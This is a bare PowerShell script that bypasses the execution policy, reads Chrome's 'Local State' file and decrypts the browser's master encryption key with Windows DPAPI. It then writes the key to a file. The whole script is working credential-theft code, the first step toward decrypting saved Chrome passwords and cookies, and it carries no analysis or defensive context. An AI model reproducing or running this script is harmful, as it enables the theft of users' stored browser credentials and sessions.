$env:PSExecutionPolicyPreference="bypass"
# Load the necessary .NET assembly
Add-Type -AssemblyName "System.Security"
$OutputFilePath=".\PATH\masterkey"

# Read the file
$localStateContent = Get-Content -Path "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\local state" -Raw

# Use regex to find the encrypted_key value -> "encrypted_key": "master_key"
$matchFound = $localStateContent -match '"encrypted_key"\s*:\s*"([^"]+)"'
if (-not $matchFound) {
    Write-Error "Could not find 'encrypted_key' in the input file."
    exit
}
$encryptedKeyBase64 = $matches[1]
# Convert the base64 string to byte array
$encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKeyBase64)
 # Strip the 'DPAPI' prefix
$dpapiBytes = $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)]
#  $hexString = -join ($dpapiBytes | ForEach-Object { $_.ToString("x2") })
 # Decrypt the bytes using DPAPI
$decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($dpapiBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
# Write the decrypted master key to the output file
[System.IO.File]::WriteAllBytes($OutputFilePath, $decryptedBytes)
Write-Output "Master key written to $OutputFilePath"